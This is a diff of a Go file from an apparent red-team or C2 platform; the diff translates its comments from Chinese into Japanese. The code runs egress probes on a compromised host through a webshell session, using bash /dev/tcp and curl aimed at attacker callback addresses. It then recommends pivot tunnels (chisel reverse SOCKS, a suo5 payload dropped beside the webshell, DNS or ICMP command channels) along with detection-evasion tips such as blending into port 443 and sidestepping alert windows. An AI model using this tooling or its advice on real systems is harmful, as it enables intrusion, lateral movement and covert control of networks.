@@ -1,12 +1,12 @@
-// probe.go 是四件套之 probe：经会话在目标侧真实执行出网探针（TCP 到各
-// attackAddr、DNS 解析、HTTP 出网、ICMP 可选），回显用确定性哨兵标记解析，
-// Conclude 做证据分档选型（照 pivot 骨架：能 TCP 出→反向 socks;只 DNS→命令通道
-// 级说明；全断→建议正向/webshell 通道）。解析与分档都是纯函数。
+// probe.go は 4 点セットの probe：セッション経由でターゲット側の外向き通信プローブを実際に実行する（TCP を各
+// attackAddr へ、DNS 解決、HTTP の外向き通信、ICMP は任意）。応答は決定的なセンチネルマーカーで解析し、
+// Conclude がエビデンスの段階分けによる方式選定を行う（pivot の骨格に倣う：TCP 外向き可→リバース socks、DNS のみ→コマンドチャネル
+// 級の説明；全断→フォワード/webshell チャネルを提案）。解析と段階分けはどちらも純粋関数。
 //
-// TCP 探针是三态判定而非「连上才算通」:connect 成功=reachable；快速 RST/拒连
-// (refused)=reachable（路径通、对端暂无监听——RST 证明包能到，隧道监听该口即可
-// 回连）；超时/无响应=filtered（真被过滤）。探测目标除常用口 443/80/53 外，还含
-// 隧道端口池采样（ProbeAddrs：起始终端各 1 个），隧道实际要用的端口必须被探测到。
+// TCP プローブは 3 状態判定で、「接続できたときだけ通」ではない：connect 成功 = reachable；即時 RST/接続拒否
+// （refused）= reachable（経路は通っており、接続先に待受がないだけ——RST はパケットが届く証拠で、トンネルがその口を
+// 待ち受ければコールバックできる）；タイムアウト/無応答 = filtered（本当にフィルタされている）。プローブ対象は常用口 443/80/53 のほか、
+// トンネルポートプールのサンプル（ProbeAddrs：開始と終端を各 1 個）も含む。トンネルが実際に使うポートは必ずプローブ対象にする。
 package tunnel
 
 import (
@@ -20,39 +20,39 @@ import (
 	"github.com/Autumn-27/artex/session"
 )
 
-// probeTimeout 是单条探针命令的目标侧超时。
+// probeTimeout は 1 本のプローブコマンドのターゲット側タイムアウト。
 const probeTimeout = 20 * time.Second
 
-// TCPState 是 TCP 探针的三态结论。判定从「连上才算通」改为区分路径证据：
-// 对授权内网场景，防火墙上「未监听」与「丢包过滤」是两种截然不同的姿态——
-// RST(refused）证明包能到对端，路径是通的，隧道监听该口即可回连；
-// 超时才说明包被过滤，路径真不通。
+// TCPState は TCP プローブの 3 状態の結論。判定を「接続できたときだけ通」から経路のエビデンスの区別に変える：
+// 認可されたイントラネットの現場では、ファイアウォール上の「未待受」と「パケット破棄によるフィルタ」はまったく異なる挙動——
+// RST（refused）はパケットが接続先に届く証拠で、経路は通っており、トンネルがその口を待ち受ければコールバックできる；
+// タイムアウトのときはパケットがフィルタされており、経路が本当に通らないと判断できる。
 type TCPState string
 
 const (
-	TCPConnected TCPState = "connected" // 有服务监听，connect 成功
-	TCPRefused   TCPState = "refused"   // 快速 RST/拒连：路径通、暂无监听
-	TCPFiltered  TCPState = "filtered"  // 超时/无响应：被过滤，路径不通
-	TCPFail      TCPState = "fail"      // 其它失败（无 bash、解析失败等）
+	TCPConnected TCPState = "connected" // サービスが待受中で、connect 成功
+	TCPRefused   TCPState = "refused"   // 即時 RST/接続拒否：経路は通る、待受なし
+	TCPFiltered  TCPState = "filtered"  // タイムアウト/無応答：フィルタされ経路不通
+	TCPFail      TCPState = "fail"      // その他の失敗（bash がない、解析失敗など）
 )
 
-// ProbeResult 是一条探针的证据。
+// ProbeResult は 1 本のプローブのエビデンス。
 type ProbeResult struct {
 	Name   string `json:"name"`   // tcp_1 / http_1 / dns / icmp
 	Kind   string `json:"kind"`   // tcp | http | dns | icmp
-	Target string `json:"target"` // 探测对端
+	Target string `json:"target"` // プローブ対象の接続先
 	OK     bool   `json:"ok"`
-	State  string `json:"state,omitempty"` // tcp 探针的三态（connected/refused/filtered/fail)
-	Detail string `json:"detail"`          // 回显摘要（截断）
+	State  string `json:"state,omitempty"` // tcp プローブの 3 状態（connected/refused/filtered/fail）
+	Detail string `json:"detail"`          // 応答の要約（切り詰め）
 }
 
-// ProbeReport 是结构化出网报告。
+// ProbeReport は構造化された外向き通信レポート。
 type ProbeReport struct {
 	SessionID int64         `json:"session_id"`
 	Results   []ProbeResult `json:"results"`
 }
 
-// OKKind 返回某类探针是否有通的。
+// OKKind はある種類のプローブに通ったものがあるかを返す。
 func (r *ProbeReport) OKKind(kind string) bool {
 	for _, p := range r.Results {
 		if p.Kind == kind && p.OK {
@@ -62,7 +62,7 @@ func (r *ProbeReport) OKKind(kind string) bool {
 	return false
 }
 
-// FirstOKPort 返回首个 TCP 探通的对端端口（建议 server 监听口：回连走得通）。
+// FirstOKPort は最初に TCP で通った接続先ポートを返す（server の待受口の候補：コールバックが通る）。
 func (r *ProbeReport) FirstOKPort() int {
 	for _, p := range r.Results {
 		if p.Kind != "tcp" || !p.OK {
@@ -77,18 +77,18 @@ func (r *ProbeReport) FirstOKPort() int {
 	return 0
 }
 
-// probeCmd 组装一条带确定性哨兵的探针命令。标记形如 ARTEX_<TAG>_OK /
-// ARTEX_<TAG>_FAIL，解析只认标记（PivotHub 语义：输出污染/粘连不得误判）。
+// probeCmd は決定的なセンチネル付きのプローブコマンドを組み立てる。マーカーは ARTEX_<TAG>_OK /
+// ARTEX_<TAG>_FAIL の形で、解析はマーカーだけを見る（PivotHub の意味論：出力の汚染/混入で誤判定してはならない）。
 func probeCmd(kind, tag, target string) string {
 	ok := "ARTEX_" + tag + "_OK"
 	fail := "ARTEX_" + tag + "_FAIL"
 	host, port, _ := net.SplitHostPort(target)
 	switch kind {
 	case "tcp":
-		// /dev/tcp 是 bash 特性;sh 不存在时经 bash -c 兜底，bash 也没有则 FAIL。
-		// 三态判定：rc=0 连接成功;rc=124 是 timeout 包装判定的超时 → FILTERED;
-		// 输出含 refused（大小写不敏感，覆盖各 bash 版本 "Connection refused" 与
-		// zh locale「拒绝」措辞）→ REFUSED（快速 RST，路径通、暂无监听）;其余 FAIL。
+		// /dev/tcp は bash の機能、sh にない場合は bash -c で補い、bash もなければ FAIL。
+		// 3 状態判定：rc=0 は接続成功、rc=124 は timeout ラッパーが判定したタイムアウト → FILTERED、
+		// 出力に refused を含む（大文字小文字を問わず、各 bash 版の "Connection refused" と
+		// 中国語ロケールの拒否表現をカバー）→ REFUSED（即時 RST、経路は通るが待受なし）、それ以外は FAIL。
 		return fmt.Sprintf(`out=$(timeout 6 bash -c '</dev/tcp/%s/%s' 2>&1); rc=$?; `+
 			`if [ $rc -eq 0 ]; then echo %s; `+
 			`elif [ $rc -eq 124 ]; then echo %s_FILTERED; `+
@@ -96,8 +96,8 @@ func probeCmd(kind, tag, target string) string {
 			`else echo %s_FAIL; fi`,
 			host, port, ok, ok, ok, ok)
 	case "http":
-		// HTTP 出网：拿到任何真实 HTTP 状态码（含 403/502，多为出口代理回包）即算通；
-		// 000 = 连接层失败。
+		// HTTP 外向き通信：実際の HTTP ステータスコードが得られたら（403/502 を含む。多くは出口プロキシの応答）通とみなす；
+		// 000 = 接続層の失敗。
 		return fmt.Sprintf(`code=$(curl -s -o /dev/null -m 8 -w '%%{http_code}' http://%s/ 2>/dev/null); [ -n "$code" ] && [ "$code" != "000" ] && echo %s_$code || echo %s_$code`,
 			target, ok, fail)
 	case "dns":
@@ -109,8 +109,8 @@ func probeCmd(kind, tag, target string) string {
 	return "echo " + fail
 }
 
-// ParseProbeOutput 解析探针回显：只认 ARTEX_<TAG>_OK / _FAIL 哨兵。
-// 第二返回值表示是否找到标记（false = 通道异常/输出被污染，按不通处理但 Detail 如实记录）。纯函数。
+// ParseProbeOutput はプローブ応答を解析する：ARTEX_<TAG>_OK / _FAIL のセンチネルだけを見る。
+// 2 番目の戻り値はマーカーが見つかったか（false = チャネル異常/出力汚染。通らないものとして扱うが Detail にはありのまま記録する）。純粋関数。
 func ParseProbeOutput(tag, out string) (ok, found bool) {
 	if strings.Contains(out, "ARTEX_"+tag+"_OK") {
 		return true, true
@@ -121,8 +121,8 @@ func ParseProbeOutput(tag, out string) (ok, found bool) {
 	return false, false
 }
 
-// ParseTCPOutput 解析 TCP 探针回显为三态（见 TCPState)。只认哨兵；
-// 注意带后缀的标记（_OK_REFUSED 等）必须先于裸 _OK/_FAIL 匹配。纯函数。
+// ParseTCPOutput は TCP プローブの応答を 3 状態に解析する（TCPState 参照）。センチネルだけを見る；
+// 接尾辞付きのマーカー（_OK_REFUSED など）は接尾辞なしの _OK/_FAIL より先にマッチさせる必要がある。純粋関数。
 func ParseTCPOutput(tag, out string) (state TCPState, found bool) {
 	base := "ARTEX_" + tag + "_OK"
 	switch {
@@ -138,10 +138,10 @@ func ParseTCPOutput(tag, out string) (state TCPState, found bool) {
 	return TCPFail, false
 }
 
-// ProbeAddrs 组装 TCP 探测目标：常用回连口 443/80/53 + 隧道端口池采样（起始终端
-// 各 1 个，如 20000 与 21000)——隧道实际要用的端口必须被探测到，否则「常用口被过滤」
-// 会掩盖「隧道端口池其实可达」。poolRange 非法时忽略池采样，不阻塞基础探测；
-// 与常用口重复的池端口去重。纯函数。
+// ProbeAddrs は TCP プローブ対象を組み立てる：常用コールバック口 443/80/53 + トンネルポートプールのサンプル（開始と終端
+// を各 1 個、例えば 20000 と 21000）——トンネルが実際に使うポートは必ずプローブ対象にする。そうしないと「常用口がフィルタされている」
+// ことが「トンネルポートプールは実は到達可能」を覆い隠す。poolRange が不正ならプールのサンプルは無視し、基本のプローブは止めない；
+// 常用口と重複するプールポートは重複除去する。純粋関数。
 func ProbeAddrs(host, poolRange string) []string {
 	ports := []int{443, 80, 53}
 	if lo, hi, err := ParsePortRange(poolRange); err == nil {
@@ -171,32 +171,32 @@ func detailOf(out string) string {
 	return out
 }
 
-// Probe 经会话在目标侧执行出网探针。attackAddrs 是 "host:port" 列表（通常平台
-// callback 地址 + 常用回连端口）;icmp=true 时追加 ICMP 探针（可选，噪声大）。
-// 单针失败不中断，证据全部入报告；会话本身失败才返回 error。
+// Probe はセッション経由でターゲット側の外向き通信プローブを実行する。attackAddrs は "host:port" のリスト（通常はプラットフォームの
+// callback アドレス + 常用コールバックポート）、icmp=true なら ICMP プローブも追加する（任意、ノイズが多い）。
+// 個々のプローブの失敗では中断せず、エビデンスはすべてレポートに入れる；セッション自体の失敗だけが error になる。
 func Probe(ctx context.Context, sess session.Session, attackAddrs []string, icmp bool) (*ProbeReport, error) {
 	rep := &ProbeReport{SessionID: sess.ID()}
 	run := func(kind, tag, target string) {
 		stdout, _, err := sess.Exec(ctx, probeCmd(kind, tag, target), probeTimeout)
 		res := ProbeResult{Name: strings.ToLower(tag), Kind: kind, Target: target}
 		if err != nil {
-			res.Detail = "会话执行失败: " + err.Error()
+			res.Detail = "セッションの実行に失敗しました: " + err.Error()
 		} else if kind == "tcp" {
 			state, found := ParseTCPOutput(tag, stdout)
 			res.State = string(state)
-			// refused 算通：对授权内网场景，「未监听」与「丢包过滤」是两种姿态，
-			// RST 证明包能到对端——隧道 server 监听该口即可回连。
+			// refused も通とみなす：認可されたイントラネットの現場では「未待受」と「パケット破棄によるフィルタ」は別の挙動で、
+			// RST はパケットが接続先に届く証拠——トンネル server がその口を待ち受ければコールバックできる。
 			res.OK = state == TCPConnected || state == TCPRefused
 			res.Detail = detailOf(stdout)
 			if !found {
-				res.Detail = "未找到探针哨兵标记（通道异常/输出污染）: " + res.Detail
+				res.Detail = "プローブのセンチネルマーカーが見つかりません（チャネル異常/出力汚染）: " + res.Detail
 			}
 		} else {
 			ok, found := ParseProbeOutput(tag, stdout)
 			res.OK = ok
 			res.Detail = detailOf(stdout)
 			if !found {
-				res.Detail = "未找到探针哨兵标记（通道异常/输出污染）: " + res.Detail
+				res.Detail = "プローブのセンチネルマーカーが見つかりません（チャネル異常/出力汚染）: " + res.Detail
 			}
 		}
 		rep.Results = append(rep.Results, res)
@@ -212,7 +212,7 @@ func Probe(ctx context.Context, sess session.Session, attackAddrs []string, icmp
 		dnsHost, _, _ = net.SplitHostPort(attackAddrs[0])
 	}
 	if dnsHost == "" || net.ParseIP(dnsHost) != nil {
-		dnsHost = "www.baidu.com" // 对端是 IP 时改测公网域名，验 DNS 递归本身
+		dnsHost = "www.baidu.com" // 接続先が IP のときは公衆ドメインに変えて測り、DNS 再帰そのものを検証する
 	}
 	run("dns", "DNS", dnsHost)
 	if icmp {
@@ -225,34 +225,34 @@ func Probe(ctx context.Context, sess session.Session, attackAddrs []string, icmp
 	return rep, nil
 }
 
-// 证据分档（Conclusion.Grade)。
+// エビデンスの段階分け（Conclusion.Grade）。
 const (
-	GradeTCPEgress = "tcp_egress" // 能 TCP 出 → 反向 socks
-	GradeHTTPOnly  = "http_only"  // 仅 HTTP 出网
-	GradeDNSOnly   = "dns_only"   // 仅 DNS 出网
-	GradeICMPOnly  = "icmp_only"  // 仅 ICMP
+	GradeTCPEgress = "tcp_egress" // TCP 外向き可 → リバース socks
+	GradeHTTPOnly  = "http_only"  // HTTP のみ外向き可
+	GradeDNSOnly   = "dns_only"   // DNS のみ外向き可
+	GradeICMPOnly  = "icmp_only"  // ICMP のみ
 	GradeIsolated  = "isolated"   // 全断
 )
 
-// Conclusion 是证据分档选型结论。
+// Conclusion はエビデンスの段階分けによる方式選定の結論。
 type Conclusion struct {
 	Grade            string `json:"grade"`
-	Feasible         bool   `json:"feasible"`                 // 反向隧道（chisel）是否可直接上
-	SuggestedPort    int    `json:"suggested_port,omitempty"` // 建议 server 监听口（首个 TCP 探通口）
-	SuggestedAdapter string `json:"suggested_adapter"`        // 推荐适配器：chisel | suo5
+	Feasible         bool   `json:"feasible"`                 // リバーストンネル（chisel）をそのまま使えるか
+	SuggestedPort    int    `json:"suggested_port,omitempty"` // 推奨する server 待受口（最初に TCP で通った口）
+	SuggestedAdapter string `json:"suggested_adapter"`        // 推奨アダプタ：chisel | suo5
 	Recommendation   string `json:"recommendation"`
 }
 
-// Conclude 证据分档选型（纯函数；档位严格不混同，照 pivot 骨架）:
-//   - 任一 TCP 目标 reachable（含 refused:RST 证明包能到，对端只是暂无监听，
-//     隧道 server 监听该口即可回连）→ tcp_egress，反向 socks(chisel --reverse),
-//     监听口取首个探通口；
-//   - 全部 filtered（超时丢包）但 HTTP 通 → http_only:HTTP 承载——suo5 走入向
-//     HTTP 不依赖出网，优先；或 chisel 走 WebSocket over 443 换特征；
-//   - 全 filtered 但 DNS 通 → dns_only：命令通道级（KB/s 以下），别建数据隧道；
-//   - 只 ICMP → icmp_only：控制信令级；
-//   - 全断 → no_egress(isolated)：反向隧道不可行，但探测本身经 webshell 会话完成
-//     （即 webshell 必可用）→ 推荐 suo5(HTTP 隧道，不依赖目标出网）。
+// Conclude はエビデンスの段階分けによる方式選定（純粋関数。段階は厳密に区別し混同しない。pivot の骨格に倣う）：
+//   - いずれかの TCP ターゲットが reachable（refused を含む：RST はパケットが届く証拠で、接続先に待受がないだけ。
+//     トンネル server がその口を待ち受ければコールバックできる）→ tcp_egress、リバース socks（chisel --reverse）、
+//     待受口は最初に通った口を取る；
+//   - すべて filtered（タイムアウトで破棄）だが HTTP は通る → http_only：HTTP で運ぶ——suo5 は受信方向の
+//     HTTP を使い、外向き通信に依存しないため優先；または chisel を WebSocket over 443 で通して特徴を変える；
+//   - すべて filtered だが DNS は通る → dns_only：コマンドチャネル級（KB/s 以下）。データトンネルを張らない；
+//   - ICMP のみ → icmp_only：制御シグナリング級；
+//   - 全断 → no_egress（isolated）：リバーストンネルは不可。ただしプローブ自体は webshell セッション経由で完了している
+//     （= webshell は必ず使える）→ suo5 を推奨（HTTP トンネル、ターゲットの外向き通信に依存しない）。
 func Conclude(rep *ProbeReport) Conclusion {
 	if rep.OKKind("tcp") {
 		return Conclusion{
@@ -260,9 +260,9 @@ func Conclude(rep *ProbeReport) Conclusion {
 			Feasible:         true,
 			SuggestedPort:    rep.FirstOKPort(),
 			SuggestedAdapter: AdapterChisel,
-			Recommendation: "目标可 TCP 出网（connect 成功或 refused 拒连均算通——RST 证明路径可达，" +
-				"对端只是暂无监听）：直接建反向 socks 隧道（tunnel_deploy adapter=chisel kind=socks)。" +
-				"平台 chisel server 监听口优先用首个探通的回连端口（含隧道端口池采样口）；信道端口偏好 443>80>53，避 4444/8888。",
+			Recommendation: "ターゲットは TCP で外向き通信できる（connect 成功も refused 接続拒否も通とみなす——RST は経路が到達可能な証拠で、" +
+				"接続先に待受がないだけ）：リバース socks トンネルを直接張る（tunnel_deploy adapter=chisel kind=socks）。" +
+				"プラットフォームの chisel server 待受口は最初に通ったコールバックポート（トンネルポートプールのサンプル口を含む）を優先する；チャネルポートは 443>80>53 を優先し、4444/8888 を避ける。",
 		}
 	}
 	if rep.OKKind("http") {
@@ -270,9 +270,9 @@ func Conclude(rep *ProbeReport) Conclusion {
 			Grade:            GradeHTTPOnly,
 			Feasible:         true,
 			SuggestedAdapter: AdapterSuo5,
-			Recommendation: "仅 HTTP 出网（可能有强制代理/白名单）：优先 tunnel_deploy adapter=suo5" +
-				"（HTTP 隧道：payload 投到目标 Web 目录，平台经入向 HTTP 建 socks5，完全不依赖目标出网）;" +
-				"或 chisel client 走 WebSocket over 443 尝试穿透，别硬撞告警窗口。",
+			Recommendation: "HTTP のみ外向き通信可（強制プロキシ/許可リストの可能性）：tunnel_deploy adapter=suo5 を優先" +
+				"（HTTP トンネル：payload をターゲットの Web ディレクトリに配信し、プラットフォームが受信方向の HTTP で socks5 を張る。ターゲットの外向き通信に一切依存しない）、" +
+				"または chisel client を WebSocket over 443 で通すことを試し、警報ウィンドウにわざとぶつからないようにする。",
 		}
 	}
 	if rep.OKKind("dns") {
@@ -280,8 +280,8 @@ func Conclude(rep *ProbeReport) Conclusion {
 			Grade:            GradeDNSOnly,
 			Feasible:         false,
 			SuggestedAdapter: AdapterSuo5,
-			Recommendation: "仅 DNS 出网：数据隧道走 tunnel_deploy adapter=suo5(HTTP 隧道，不依赖出网）;" +
-				"DNS 只可作低频命令通道（dnscat2/iodine 类，KB/s 级），别在 DNS 上建数据隧道。",
+			Recommendation: "DNS のみ外向き通信可：データトンネルは tunnel_deploy adapter=suo5（HTTP トンネル、外向き通信に依存しない）、" +
+				"DNS は低頻度のコマンドチャネル（dnscat2/iodine の類、KB/s 級）にしか使えず、DNS 上にデータトンネルを張らない。",
 		}
 	}
 	if rep.OKKind("icmp") {
@@ -289,17 +289,17 @@ func Conclude(rep *ProbeReport) Conclusion {
 			Grade:            GradeICMPOnly,
 			Feasible:         false,
 			SuggestedAdapter: AdapterSuo5,
-			Recommendation: "仅 ICMP 可达：控制信令级通道（icmpsh 类）；数据隧道走 tunnel_deploy adapter=suo5" +
-				"（HTTP 隧道，经入向 Web 口，不依赖出网）。",
+			Recommendation: "ICMP のみ到達可能：制御シグナリング級のチャネル（icmpsh の類）；データトンネルは tunnel_deploy adapter=suo5" +
+				"（HTTP トンネル、受信方向の Web 口経由、外向き通信に依存しない）。",
 		}
 	}
 	return Conclusion{
 		Grade:            GradeIsolated,
 		Feasible:         false,
 		SuggestedAdapter: AdapterSuo5,
-		Recommendation: "四层探针全断，目标无出网：反向隧道（chisel）不可行。但本探测经 webshell 会话完成，" +
-			"即 webshell 必可用——推荐 tunnel_deploy adapter=suo5(payload 投到 webshell 同目录，" +
-			"平台经入向 HTTP 建 socks5，覆盖无出网场景）。其余转向：① 目标入向有洞时建正向隧道；" +
-			"② 继续走 webshell 会话通道（session_exec 即内网执行面）;③ 周期 pull 白名单域名取指令。",
+		Recommendation: "4 種類のプローブが全断し、ターゲットに外向き通信がない：リバーストンネル（chisel）は不可。ただし本プローブは webshell セッション経由で完了しており、" +
+			"webshell は必ず使える——tunnel_deploy adapter=suo5 を推奨（payload を webshell と同じディレクトリに配信し、" +
+			"プラットフォームが受信方向の HTTP で socks5 を張る。外向き通信のない状況をカバー）。その他の方向転換：① ターゲットの受信方向に穴があればフォワードトンネルを張る；" +
+			"② webshell セッションのチャネルを続けて使う（session_exec がイントラネットの実行面）、③ 許可リストのドメインを定期的に pull して指令を取る。",
 	}
 }
